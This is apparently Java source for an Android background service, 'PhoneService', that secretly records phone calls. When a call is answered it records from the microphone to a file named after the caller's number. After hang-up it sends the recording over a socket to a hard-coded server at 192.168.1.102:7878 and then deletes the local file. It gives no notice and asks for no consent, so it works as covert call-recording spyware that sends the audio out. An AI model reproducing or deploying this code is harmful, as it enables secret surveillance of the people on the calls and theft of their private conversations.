package com.fangwei.phonelistener;

import java.io.File;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.fangwei.utils.StreamTool;

public class PhoneService extends Service {

	public IBinder onBind(Intent intent) {
		return null;
	}

	public void onCreate() {
		super.onCreate();
		//初始化一些对象
		TelephonyManager telephonyManager = 
				(TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telephonyManager.listen(new MyPhoneStateListener(), PhoneStateListener.LISTEN_CALL_STATE);
	}
	
	private final class MyPhoneStateListener extends PhoneStateListener{
		private String number;
		private MediaRecorder recorder;
		private File file;
		
		public void onCallStateChanged(int state, String incomingNumber) {
			try{
				switch (state) {
				case TelephonyManager.CALL_STATE_RINGING://来电状态
					number = incomingNumber;
					break;

				case TelephonyManager.CALL_STATE_OFFHOOK://接通电话状态
					file = new File(Environment.getExternalStorageDirectory(), 
							System.currentTimeMillis()+number+".3gp");
					recorder = new MediaRecorder();
					recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
					recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
					recorder.setOutputFile(file.getAbsolutePath());
					recorder.prepare();
					recorder.start();
					break;
				case TelephonyManager.CALL_STATE_IDLE:
					if(recorder!=null){
						recorder.stop();
						recorder.release();
						recorder = null;
						new Thread(new Runnable() {
							public void run() {
								uploadFile();
							}
						}).start();
					}
					break;
				}
			}catch (Exception e) {
				e.printStackTrace();
			}
			
		}

		protected void uploadFile() {
			try {
				Socket socket = new Socket("192.168.1.102", 7878);
	            OutputStream outStream = socket.getOutputStream(); 
	            String head = "Content-Length="+ file.length() +
	            		";filename="+ file.getName() + ";sourceid=\r\n";
	            outStream.write(head.getBytes());
	            
	            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());	
				String response = StreamTool.readLine(inStream);
	            String[] items = response.split(";");
				String position = items[1].substring(items[1].indexOf("=")+1);
				
				RandomAccessFile fileOutStream = new RandomAccessFile(file, "r");
				fileOutStream.seek(Integer.valueOf(position));
				byte[] buffer = new byte[1024];
				int len = -1;
				while( (len = fileOutStream.read(buffer)) != -1){
					outStream.write(buffer, 0, len);
				}
				fileOutStream.close();
				outStream.close();
	            inStream.close();
	            socket.close();
	            file.delete();
	        } catch (Exception e) {                    
	            e.printStackTrace();
	        }
		}
		
	}
}
